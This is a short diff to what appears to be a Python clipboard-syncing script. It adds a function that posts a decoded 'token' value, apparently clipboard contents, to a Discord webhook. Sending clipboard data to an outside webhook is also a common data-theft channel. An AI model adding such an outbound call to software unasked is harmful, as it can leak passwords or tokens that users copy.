@@ -33,3 +33,9 @@ def setClipboardAndroid(message):
     response = requests.post(url, json=data)
     return response
 
+def sendingClipboard(token):
+    url = f'https://discord.com/api/webhooks/{webhook_id}/{webhook_token}'
+    data = {'content': token.decode()}
+    headers = {"Content-Type": "application/json"}
+    response = requests.post(url, headers=headers, json=data)
+    return response
